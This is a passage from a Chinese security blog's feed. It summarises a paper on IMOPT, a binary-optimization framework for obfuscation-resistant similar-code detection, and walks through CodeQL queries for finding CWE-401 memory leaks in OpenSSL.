alt="image-20201125162150632"></p><p>和<code>IMSSA</code>很像，只是不处理已经处理过的基本块</p><h3><span id="per-jin-zhi-you-hua-kuang-jia">二进制优化框架</span><a href="#per-jin-zhi-you-hua-kuang-jia" class="header-anchor">#</a></h3><p>框架试图通过正规化和删除无用代码，来缓解编译优化和混淆对相似代码检测的影响,由于框架是由指针分析驱动的，所以它应该对基于数据依赖的代码转换具有鲁棒性。</p><h4><span id="pji-cheng-zhi-zhen-fen-xi">集成指针分析</span><a href="#pji-cheng-zhi-zhen-fen-xi" class="header-anchor">#</a></h4><p>在实现IMSSA过程中，需要加入指针分析，除了<code>E:V(Dominating def)</code>和<code>C:V(最大SSA下标数)</code>，还需要维护<code>D：V-&gt;E</code>(变量-&gt;def表达式)和<code>A:E-&gt;V</code>（地址表达式-&gt;变量）</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114840.jpg" alt="image-20201124161215234"></p><ol><li><code>LINE 3-4</code>：如果是变量，得到该变量的表达式</li><li><code>LINE 5</code>：遍历表达式中的变量，进行指针分析</li><li><code>LINE 8</code>：对分析后的语句进行归一化(逻辑)</li><li><code>LINE 10-11</code>：对指针变量进行处理</li></ol><p>我们知道在IR中，<code>STORE</code>和<code>LOAD</code>都是对地址进行操作的，因此在实现指针分析时，主要关注这两个指令。</p><h4><span id="pzheng-gui-hua-he-si-dai-ma-shan-chu">正规化和死代码删除</span><a href="#pzheng-gui-hua-he-si-dai-ma-shan-chu" class="header-anchor">#</a></h4><p>正规化将等价但不同的表达式转换成统一形式，从而保持相似性。同时可以实现多级联合消除，例如公共子表达式消除等，进而去除无用代码</p><ul><li>正规化：收集了44个基本的消除规则(参考ollvm)，例如$(x \And c ) \oplus (x|c) \iff x \oplus c，(x \And c) |(x \And !c) \iff x$</li><li>死代码删除：在根据def-use分析和可达性分析，删除无用代码</li></ul><h3><span id="pshi-xian-he-ping-gu">实现和评估</span><a href="#pshi-xian-he-ping-gu" class="header-anchor">#</a></h3><p>作者在二进制分析平台<code>BAP</code>上以插件形式实现<code>IMOPT</code>过程：使用<code>BAP</code>将二进制转换到它的IR上<code>BIR</code>，然后用插件实现<code>IMOPT</code>过程</p><p>为了对比实验，也使用<code>Mcsema</code>将二进制转换到<code>LLVM-IR</code>上进行<code>re-optimize</code>(对比IMOPT优化和LLVM-OPT)的效果</p><h4><span id="pdui-bi-asm2vec">对比Asm2Vec</span><a href="#pdui-bi-asm2vec" class="header-anchor">#</a></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 					BAP IR  -&gt;   IMOPT  -&gt; new binarys -&gt; Asm2vec</span><br><span class="line">        &#x2F;                                                   \</span><br><span class="line">binarys                                                       compare </span><br><span class="line">        \                                                   &#x2F; </span><br><span class="line">           ------------------&gt; Asm2vec -----------------</span><br></pre></td></tr></table></figure><p>通过和<code>Asm2Vec</code>对比，<code>IMOPT</code>将准确率提高了近20%</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114859.jpg" alt="image-20201124163336774"></p><h4><span id="pkang-hun-yao-xing-neng">抗混淆性能</span><a href="#pkang-hun-yao-xing-neng" class="header-anchor">#</a></h4><p><strong>ollvm回顾</strong></p><p><code>-sub</code>：指令混淆</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114912.jpg" alt="image-20201125143529563"></p><p><code>-bcf</code>：引入虚假控制流：在原来的控制流图上，通过加入条件跳转语句跳转到一个原来的基本块或者是一个虚假的基本块，并最终跳转回条件跳转语句，引入循环结构，改变控制流图。</p><p>示例如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引入虚假控制流前</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114926.jpg" alt="image-20201125145520337"></p><p>引入虚假控制流后</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114938.jpg" alt="image-20201125145547632"></p><p><code>-flat</code>：控制流平坦化：使用一个主分发块，通过条件控制分别进入不同的基本块，然后再回到主分发块，虽然逻辑和原来的程序相同，但分析起来更加复杂，类似于虚拟机</p><p>对上面函数的控制流平坦化结果如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114948.jpg" alt="image-20201125145807147"></p><p>使用<code>ollvm 4.0</code>混淆后进行测试，主要测试了<code>-sub</code>，<code>-bcf</code>，<code>-flat</code>选项，结果如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-114958.jpg" alt="image-20201125145912158"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 							   BAP IR  -&gt;   IMOPT  -&gt; new binarys -&gt; Asm2vec</span><br><span class="line">              &#x2F;                                                   \</span><br><span class="line">ollvm binarys                                                       compare </span><br><span class="line">              \                                                   &#x2F; </span><br><span class="line">                LLVM IR  -&gt; LLVM-OPT -&gt; new binarys -&gt; Asm2vec</span><br></pre></td></tr></table></figure><h4><span id="pzhi-zhen-fen-xi-xiao-lu-dui-bi">指针分析效率对比</span><a href="#pzhi-zhen-fen-xi-xiao-lu-dui-bi" class="header-anchor">#</a></h4><p>和<code>SDA(the most efficient approach that supports both pointer and reachability analysis)</code>进行了比较，速度得到了大大提升(<code>15.7x</code>)。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-12-01-115005.jpg" alt="image-20201125162407166"></p><h3><span id="pzong-jie">总结</span><a href="#pzong-jie" class="header-anchor">#</a></h3><p>我感觉这个东西虽然看起来艰涩难懂，但其实和传统的SSA算法区别没有很大，且对于最重要的指针分析作者并未提供十分有效的细节</p><p>另外有两个点值得去思考：</p><ol><li>第一点：对于ollvm，有很多人做去混淆等相关工作了，看得出来这项工作有专门针对ollvm去做研究(比如复杂逻辑的缩减)，不知道对于其他的混淆方法，效果是否有对ollvm的提升那么明显</li><li>第二点是我自己也不明白的，文中指出即使是编译器对指针分析后优化也会出错，但从算法上看或者也没有案例说明文中的算法不会出现类似的问题</li></ol><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><a href="https://eli.thegreenplace.net/2015/directed-graph-traversal-orderings-and-applications-to-data-flow-analysis/">https://eli.thegreenplace.net/2015/directed-graph-traversal-orderings-and-applications-to-data-flow-analysis/</a></li><li><a href="https://github.com/BinaryAnalysisPlatform/bap">https://github.com/BinaryAnalysisPlatform/bap</a></li><li><a href="https://github.com/lifting-bits/mcsema">https://github.com/lifting-bits/mcsema</a></li><li><a href="https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0">https://github.com/obfuscator-llvm/obfuscator/tree/llvm-4.0</a></li></ul>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>automatic_analyse</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>automatic analyse</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL之CWE-401(4)</title>
    <url>/fcace802.html</url>
    <content><![CDATA[<blockquote><p>之前我们简要的将CWE-401分为了两类：第一类为(过程内)不存在一条路径，将已分配的内存进行了释放，而在写脚本时，我们并没有解决参数传递导致的误报</p></blockquote><a id="more"></a><h3><span id="pguo-cheng-nei-can-shu-chuan-di-wen-ti">过程内参数传递问题</span><a href="#pguo-cheng-nei-can-shu-chuan-di-wen-ti" class="header-anchor">#</a></h3><p>只在单个函数内找漏洞，需要解决以下两类参数传递问题</p><ol><li>分配的内存通过函数参数传递回caller</li><li>分配的内存通过函数返回值返回给caller</li></ol><p>因此，在之前的查询脚本上，我们可以加入上面两类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.Guards</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_pre</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_new"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_post</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_free"</span>) &#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node source, DataFlow::Node sink, FunctionCall fc</span><br><span class="line">where</span><br><span class="line">  exists( | 																</span><br><span class="line">    DataFlow::localFlow(source, sink) and</span><br><span class="line">    source.asExpr() <span class="keyword">instanceof</span> FunctionCall and</span><br><span class="line">    check_name_pre(source.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">    check_name_post(fc.getTarget()) and</span><br><span class="line">    fc.getAnArgument() = sink.asExpr()</span><br><span class="line">  )</span><br><span class="line">  or</span><br><span class="line">  exists(ReturnStmt ret |								<span class="comment">// 第一类</span></span><br><span class="line">    DataFlow::localFlow(source, sink) and</span><br><span class="line">    source.asExpr() <span class="keyword">instanceof</span> FunctionCall and</span><br><span class="line">    check_name_pre(source.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">    ret.getExpr() = sink.asExpr()</span><br><span class="line">  )</span><br><span class="line">  or</span><br><span class="line">  exists( Parameter p |								  <span class="comment">// 第二类	</span></span><br><span class="line">    DataFlow::localFlow(source, sink) and</span><br><span class="line">    source.asExpr() <span class="keyword">instanceof</span> FunctionCall and</span><br><span class="line">    check_name_pre(source.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">    sink.asExpr().getAChild*() = p.getAnAccess()</span><br><span class="line">  )</span><br><span class="line">select source.asExpr(), source.asExpr().getLocation()</span><br></pre></td></tr></table></figure><p>由于codeql对or连接符查询的优化并不好，所以我们可以分为三个脚本，最后取合集</p><p><strong>exp1.ql</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.Guards</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_pre</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_new"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_post</span><span class="params">(Function func)</span> </span>&#123;func.getName().matches(<span class="string">"RSA_free"</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// situation 1</span></span><br><span class="line">from DataFlow::Node source,DataFlow::Node sink,FunctionCall fc</span><br><span class="line">where </span><br><span class="line">exists( |</span><br><span class="line">  DataFlow::localFlow(source, sink) and</span><br><span class="line">  source.asExpr() <span class="keyword">instanceof</span> FunctionCall and</span><br><span class="line">  check_name_pre(source.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">  check_name_post(fc.getTarget()) and</span><br><span class="line">  fc.getAnArgument()=sink.asExpr()</span><br><span class="line">  )</span><br><span class="line">select source.asExpr(),source.asExpr().getLocation()</span><br></pre></td></tr></table></figure><p><strong>exp2.ql</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.Guards</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_pre</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_new"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_post</span><span class="params">(Function func)</span> </span>&#123;func.getName().matches(<span class="string">"RSA_free"</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// situation 2</span></span><br><span class="line">from DataFlow::Node source,DataFlow::Node sink,FunctionCall fc</span><br><span class="line"><span class="function">where <span class="title">exists</span><span class="params">(ReturnStmt ret |</span></span></span><br><span class="line"><span class="function"><span class="params">  DataFlow::localFlow(source, sink)</span> and</span></span><br><span class="line"><span class="function">  source.<span class="title">asExpr</span><span class="params">()</span> <span class="keyword">instanceof</span> FunctionCall and</span></span><br><span class="line"><span class="function">  <span class="title">check_name_pre</span><span class="params">(source.asExpr()</span>.<span class="params">(FunctionCall)</span>.<span class="title">getTarget</span><span class="params">()</span>) and</span></span><br><span class="line"><span class="function">  ret.<span class="title">getExpr</span><span class="params">()</span> </span>= sink.asExpr())</span><br><span class="line">select source.asExpr(),source.asExpr().getLocation()</span><br></pre></td></tr></table></figure><p><strong>exp3.ql</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.Guards</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_pre</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_new"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_post</span><span class="params">(Function func)</span> </span>&#123;func.getName().matches(<span class="string">"RSA_free"</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// situation 3</span></span><br><span class="line">from DataFlow::Node source,DataFlow::Node sink,Parameter p</span><br><span class="line">where </span><br><span class="line">exists( |</span><br><span class="line">  DataFlow::localFlow(source, sink) and</span><br><span class="line">  source.asExpr() <span class="keyword">instanceof</span> FunctionCall and</span><br><span class="line">  check_name_pre(source.asExpr().(FunctionCall).getTarget()) and</span><br><span class="line">  sink.asExpr().getAChild*() = p.getAnAccess()</span><br><span class="line">  )</span><br><span class="line">select source.asExpr(),source.asExpr().getLocation()</span><br></pre></td></tr></table></figure><p>三类取合集后，我们最终只剩下由于<code>CodeQL sink</code>点分析有误的一个误报</p><h3><span id="pguo-cheng-jian-fen-xi">过程间分析</span><a href="#pguo-cheng-jian-fen-xi" class="header-anchor">#</a></h3><p>使用过程间分析，我们需要考虑全局的数据流关系(跨过程)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.Guards</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_pre</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_new"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">check_name_post</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_free"</span>) &#125;</span><br><span class="line"></span><br><span class="line">class MissingCloseConfig extends DataFlow::Configuration &#123;</span><br><span class="line">  MissingCloseConfig() &#123; <span class="keyword">this</span> = <span class="string">"MissingCloseConfig"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node source)</span> </span>&#123;</span><br><span class="line">    source.asExpr() <span class="keyword">instanceof</span> FunctionCall and</span><br><span class="line">    check_name_pre(source.asExpr().(FunctionCall).getTarget())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">    exists(FunctionCall fc |</span><br><span class="line">      check_name_post(fc.getTarget()) and</span><br><span class="line">      fc.getAnArgument*() = sink.asExpr()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node source, DataFlow::Node sink, MissingCloseConfig conf</span><br><span class="line">where conf.hasFlow(source, sink)</span><br><span class="line">select source.asExpr(), source.asExpr().getLocation()</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-11-22-073251.png" alt="image-20201122153251231"></p><p>抛开<code>CodeQL sink</code>点识别失败的情况，我们仍然存在一个误报如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rsa_cb</span><span class="params">(<span class="keyword">int</span> operation, ASN1_VALUE **pval, <span class="keyword">const</span> ASN1_ITEM *it,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">void</span> *exarg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (operation == ASN1_OP_NEW_PRE) &#123;</span><br><span class="line">        *pval = (ASN1_VALUE *)RSA_new();</span><br><span class="line">        <span class="keyword">if</span> (*pval != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operation == ASN1_OP_FREE_PRE) &#123;</span><br><span class="line">        RSA_free((RSA *)*pval);</span><br><span class="line">        *pval = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operation == ASN1_OP_D2I_POST) &#123;</span><br><span class="line">        <span class="keyword">if</span> (((RSA *)*pval)-&gt;version != RSA_ASN1_VERSION_MULTI) &#123;</span><br><span class="line">            <span class="comment">/* not a multi-prime key, skip */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (rsa_multip_calc_product((RSA *)*pval) == <span class="number">1</span>) ? <span class="number">2</span> : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查看源代码，我们可以发现误报的原因是：<code>openssl</code>中，没有任何函数，对<code>rsa_cb</code>函数进行了调用，因此确实不存在全局的从<code>RSA_new</code>到<code>RSA_free</code>的数据流。</p>]]></content>
      <categories>
        <category>research</category>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>research</tag>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeQL之CWE-401(3)</title>
    <url>/b3ed7ec5.html</url>
    <content><![CDATA[<blockquote><p>在第一部分中，我们将<code>CWE-401</code>简单分为两类，第一类是对于分配的内存，不存在路径对它进行了释放，第二类是有的路径释放了，而有的路径忘了释放，现在我们对第二类进行解决</p></blockquote><a id="more"></a><p>第二类示例如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">f</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">int</span> *buff = <span class="built_in">malloc</span>(SIZE*<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">		do_stuff(buff);</span><br><span class="line">		<span class="keyword">return</span> buff;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (<span class="keyword">int</span> do_stuff_exception) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">//returns NULL on error, but does not free memory</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="pzong-ti-si-lu">总体思路</span><a href="#pzong-ti-si-lu" class="header-anchor">#</a></h3><p>还是从<code>RSA_new</code>和<code>RSA_free</code>的示例出发，按照上篇博客中的<code>MemoryMayNotBeFreed</code>画瓢就行，有所区别的是，在这里想将它扩展成函数未配对使用的情况，即<code>malloc</code>却没有<code>free</code>、<code>fopen</code>却没有<code>fclose</code>。</p><h3><span id="pstep1-ding-yi-ji-ben-han-shu">STEP1 定义基本函数</span><a href="#pstep1-ding-yi-ji-ben-han-shu" class="header-anchor">#</a></h3><p>首先写上对配对函数名称检查的函数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">checkNameOpen</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_new"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">checkNameClose</span><span class="params">(Function func)</span> </span>&#123;func.getName().matches(<span class="string">"RSA_free"</span>)&#125;</span><br></pre></td></tr></table></figure><p>借鉴样板中的直接调用和间接调用(大部分应该都不会选择用间接调用，但是在linux等项目中十分普遍)，我们直接抄录直接调用和间接调用判断如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 'call' is either a direct call to f, or a possible call to f</span></span><br><span class="line"><span class="comment"> * via a function pointer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">mayCallFunction</span><span class="params">(Expr call, Function f)</span> </span>&#123;</span><br><span class="line">  call.(FunctionCall).getTarget() = f or</span><br><span class="line">  call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() =</span><br><span class="line">    f</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，样版中的赋值给全局变量或者类的域内变量也值得我们直接抄写一番</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">assignedToFieldOrGlobal</span><span class="params">(StackVariable v, Expr e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// assigned to anything except a StackVariable</span></span><br><span class="line">  <span class="comment">// (typically a field or global, but for example also *ptr = v)</span></span><br><span class="line">  e.(Assignment).getRValue() = v.getAnAccess() and</span><br><span class="line">  not e.(Assignment).getLValue().(VariableAccess).getTarget() <span class="keyword">instanceof</span> StackVariable</span><br><span class="line">  or</span><br><span class="line">  exists(Expr midExpr, Function mid, <span class="keyword">int</span> arg |</span><br><span class="line">    <span class="comment">// indirect assignment</span></span><br><span class="line">    e.(FunctionCall).getArgument(arg) = v.getAnAccess() and</span><br><span class="line">    mayCallFunction(e, mid) and</span><br><span class="line">    midExpr.getEnclosingFunction() = mid and</span><br><span class="line">    assignedToFieldOrGlobal(mid.getParameter(arg), midExpr)</span><br><span class="line">  )</span><br><span class="line">  or</span><br><span class="line">  <span class="comment">// assigned to a field via constructor field initializer</span></span><br><span class="line">  e.(ConstructorFieldInit).getExpr() = v.getAnAccess()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="pstep2-ding-yi-pi-pei-han-shu-diao-yong">STEP2 定义匹配函数调用</span><a href="#pstep2-ding-yi-pi-pei-han-shu-diao-yong" class="header-anchor">#</a></h3><p>在这一步我们还是为后面做铺垫，首先需要我们定义是否调用了匹配函数，用于source、sink和barrier点的判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">openCall</span><span class="params">(Expr e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// direct alloc call</span></span><br><span class="line">  checkNameOpen(e.(FunctionCall).getTarget())</span><br><span class="line">  <span class="comment">// We are only interested in alloc calls that are</span></span><br><span class="line">  <span class="comment">// actually freed somehow, as MemoryNeverFreed</span></span><br><span class="line">  <span class="comment">// will catch those that aren't.</span></span><br><span class="line">  or</span><br><span class="line">  exists(ReturnStmt rtn |</span><br><span class="line">    <span class="comment">// indirect alloc call</span></span><br><span class="line">    mayCallFunction(e, rtn.getEnclosingFunction()) and</span><br><span class="line">    (</span><br><span class="line">      <span class="comment">// return alloc</span></span><br><span class="line">      openCall(rtn.getExpr())</span><br><span class="line">      or</span><br><span class="line">      <span class="comment">// return variable assigned with alloc</span></span><br><span class="line">      exists(Variable v |</span><br><span class="line">        v = rtn.getExpr().(VariableAccess).getTarget() and</span><br><span class="line">        openCall(v.getAnAssignedValue()) and</span><br><span class="line">        <span class="function">not <span class="title">assignedToFieldOrGlobal</span><span class="params">(v, _)</span></span></span><br><span class="line"><span class="function">      )</span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">  )</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p><code>openCall</code>是判断表达式是不是调用了<code>Open</code>类的函数，或者说它调用了函数<code>func</code>，函数<code>func</code>里调用了<code>Open</code>类的函数，然后将返回值传递了出来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">predicate <span class="title">closeCall</span><span class="params">(ControlFlowNode n, Variable v)</span> </span>&#123;</span><br><span class="line">  exists(<span class="keyword">int</span> arg | n.(Call).getArgument(arg) = v.getAnAccess() and</span><br><span class="line">  checkNameClose(n.(Call).getTarget()))</span><br><span class="line">  or</span><br><span class="line">  exists(FunctionCall midcall, Function mid, <span class="keyword">int</span> arg |</span><br><span class="line">    <span class="comment">// indirect free call</span></span><br><span class="line">    n.(Call).getArgument(arg) = v.getAnAccess() and</span><br><span class="line">    mayCallFunction(n, mid) and</span><br><span class="line">    midcall.getEnclosingFunction() = mid and</span><br><span class="line">    closeCall(midcall, mid.getParameter(arg))</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>closeCall</code>判断是否调用了<code>Close</code>类函数，或者调用了函数<code>func</code>，传入了参数，并在<code>func</code>里对该参数调用了<code>Close</code>类函数</p><p>由于我们现在只考虑函数失去配对的情况，所以不考虑样本中<code>realloc</code>的一类情况。</p><h3><span id="pstep3-tao-tao-tao">STEP3 套套套</span><a href="#pstep3-tao-tao-tao" class="header-anchor">#</a></h3><p>对于其他的部分，我们只要修改名称为自己喜欢的就行啦，直接套用即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.Guards</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.StackVariableReachability</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">checkNameOpen</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_new"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">checkNameClose</span><span class="params">(Function func)</span> </span>&#123; func.getName().matches(<span class="string">"RSA_free"</span>) &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 'call' is either a direct call to f, or a possible call to f</span></span><br><span class="line"><span class="comment"> * via a function pointer.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">predicate <span class="title">mayCallFunction</span><span class="params">(Expr call, Function f)</span> </span>&#123;</span><br><span class="line">  call.(FunctionCall).getTarget() = f or</span><br><span class="line">  call.(VariableCall).getVariable().getAnAssignedValue().getAChild*().(FunctionAccess).getTarget() =</span><br><span class="line">    f</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">assignedToFieldOrGlobal</span><span class="params">(StackVariable v, Expr e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// assigned to anything except a StackVariable</span></span><br><span class="line">  <span class="comment">// (typically a field or global, but for example also *ptr = v)</span></span><br><span class="line">  e.(Assignment).getRValue() = v.getAnAccess() and</span><br><span class="line">  not e.(Assignment).getLValue().(VariableAccess).getTarget() <span class="keyword">instanceof</span> StackVariable</span><br><span class="line">  or</span><br><span class="line">  exists(Expr midExpr, Function mid, <span class="keyword">int</span> arg |</span><br><span class="line">    <span class="comment">// indirect assignment</span></span><br><span class="line">    e.(FunctionCall).getArgument(arg) = v.getAnAccess() and</span><br><span class="line">    mayCallFunction(e, mid) and</span><br><span class="line">    midExpr.getEnclosingFunction() = mid and</span><br><span class="line">    assignedToFieldOrGlobal(mid.getParameter(arg), midExpr)</span><br><span class="line">  )</span><br><span class="line">  or</span><br><span class="line">  <span class="comment">// assigned to a field via constructor field initializer</span></span><br><span class="line">  e.(ConstructorFieldInit).getExpr() = v.getAnAccess()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">predicate <span class="title">openCall</span><span class="params">(Expr e)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// direct alloc call</span></span><br><span class="line">  checkNameOpen(e.(FunctionCall).getTarget())</span><br><span class="line">  or</span><br><span class="line">  <span class="comment">// We are only interested in alloc calls that are</span></span><br><span class="line">  <span class="comment">// actually freed somehow, as MemoryNeverFreed</span></span><br><span class="line">  <span class="comment">// will catch those that aren't.</span></span><br><span class="line">  exists(ReturnStmt rtn |</span><br><span class="line">    <span class="comment">// indirect alloc call</span></span><br><span class="line">    mayCallFunction(e, rtn.getEnclosingFunction()) and</span><br><span class="line">    (</span><br><span class="line">      <span class="comment">// return alloc</span></span><br><span class="line">      openCall(rtn.getExpr())</span><br><span class="line">      or</span><br><span class="line">      <span class="comment">// return variable assigned with alloc</span></span><br><span class="line">      exists(Variable v |</span><br><span class="line">        v = rtn.getExpr().(VariableAccess).getTarget() and</span><br><span class="line">        openCall(v.getAnAssignedValue()) and</span><br><span class="line">        <span class="function">not <span class="title">assignedToFieldOrGlobal</span><span class="params">(v, 